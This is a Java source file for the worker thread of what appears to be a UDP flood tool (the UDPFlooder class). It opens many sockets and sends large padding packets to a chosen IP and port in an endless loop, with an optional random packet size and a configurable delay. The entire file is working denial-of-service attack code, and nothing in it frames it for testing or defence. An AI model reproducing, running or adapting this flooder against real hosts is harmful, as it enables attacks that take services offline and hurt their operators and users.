package com.protolinux;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Random;

public class FloodThread implements Runnable {
    public boolean _running = true;
    public boolean _can_run = true;
    public boolean _random_ = false;

    public UDPFlooder u_parent;

    public long delay;
    public int sock_amount;
    public int data_size;
    public int rand_size;
    public int ip_port;
    public String ip_addr;
    public String send_data;

    public ArrayList<DatagramSocket> socks;

    public FloodThread( Object[] args ) {

        try {
            // Set flood info
            ip_addr = args[0].toString();
            ip_port = Integer.valueOf(args[1].toString());
            sock_amount = Integer.valueOf(args[3].toString());
            data_size   = Integer.valueOf(args[4].toString()) * 1000;
            delay = Long.valueOf(Integer.valueOf(args[2].toString()));
            socks = new ArrayList<>();
            _random_ = (boolean) args[5];

            // Create flood info
            send_data = new String(new char[data_size]).replace("\0","x");
            byte[] sdata = send_data.getBytes();

            // create sockets
            try {
                create_socks();
            } catch( Exception e) { log("Error creating socks: "+e.getMessage()); }

        } catch(Exception e) {
            log("Init Error: "+e.getMessage());
            _can_run = false;
        }
    }

    /* Update data sent */
    public void set_parent(UDPFlooder u) {
        u_parent = u;
    }

    /* Create all the udp sockets */
    public void create_socks() throws Exception{
        int x;
        for (x=0; x<sock_amount; x++) {
            DatagramSocket sock = new DatagramSocket();
            socks.add( sock );
        }
    }

    /* Close all the udp sockets */
    public void close_socks() {
        try {
            for (DatagramSocket sock : socks) {
                sock.close();
            }
        } catch (Exception e) {}
    }

    /* Udp flooder */
    @Override
    public void run() {
        if (!_can_run) {
            __terminate__();
            return;
        }

        while (_running) {
            // if random, gen. rand size packet
            if (_random_) {
                rand_size = (new Random().nextInt(65-5)+5) * 1000;
                data_size = rand_size;
                send_data = new String(new char[data_size]).replace("\0","x");

            }

            // Send udp packet with all sockets
            for (DatagramSocket sock : socks) {
                try {
                    // create udp packet
                    byte[] sdata = send_data.getBytes();
                    InetAddress inet_addr = InetAddress.getByName( ip_addr );
                    DatagramPacket packet = new DatagramPacket(sdata, sdata.length, inet_addr, ip_port );

                    // send packet
                    sock.send( packet );
                    u_parent.data_sent += data_size / 1000;
                } catch (Exception e) {
                    log("Error sending: "+e.getMessage());
                    __terminate__();
                }
            }

            // Sleep for delay
            try { Thread.sleep( delay ); }
            catch (Exception e) {}

        }
    }

    /* Stop the Thread */
    public void __terminate__() {
        _can_run = false;
        _running = false;
        close_socks();
    }

    /* For debugging */
    public void log(Object s) {
        System.out.print( s );
        System.out.print("\n");
    }
}
